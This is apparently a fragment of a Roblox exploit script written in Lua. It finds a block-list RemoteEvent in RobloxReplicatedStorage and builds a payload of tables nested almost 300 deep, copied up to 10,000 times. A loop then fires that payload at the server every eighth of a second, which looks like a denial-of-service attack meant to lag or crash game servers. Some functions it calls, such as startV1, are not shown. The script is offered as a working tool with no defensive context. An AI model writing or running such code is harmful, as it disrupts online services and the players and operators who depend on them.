local function findRemote()
local storage = game:FindFirstChild("RobloxReplicatedStorage")
if not storage then return nil end
local names = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}
for _, name in ipairs(names) do
local r = storage:FindFirstChild(name)
if r and r:IsA("RemoteEvent") then
return r
end
end
for _, child in ipairs(storage:GetChildren()) do
if child:IsA("RemoteEvent") and child.Name:find("Block") then
return child
end
end
return nil
end
local function buildPayload()
local main = {}
local nested = {{}}
local current = nested[1]
for _ = 1, 296 do
local new = {}
table.insert(current, new)
current = new
end
local maxRep = math.min(math.floor(State.Power / 298), 10000)
for _ = 1, maxRep do
table.insert(main, nested)
end
return main
end
local function startV2()
if not remote then
remote = findRemote()
if not remote then return end
end
payload = buildPayload()
if loopTask then
task.cancel(loopTask)
loopTask = nil
end
loopTask = task.spawn(function()
while State.Enabled do
if not remote then
remote = findRemote()
task.wait(1)
else
pcall(function()
remote:FireServer(payload)
end)
task.wait(0.125)
end
end
end)
end
local function stopV2()
if loopTask then
task.cancel(loopTask)
loopTask = nil
end
end
local function startBypass()
if State.Mode == "V1" then
startV1()
elseif State.Mode == "V2" then
startV2()
end
end
local function stopBypass()
if State.Mode == "V1" then
stopV1()
elseif State.Mode == "V2" then
stopV2()
end
end
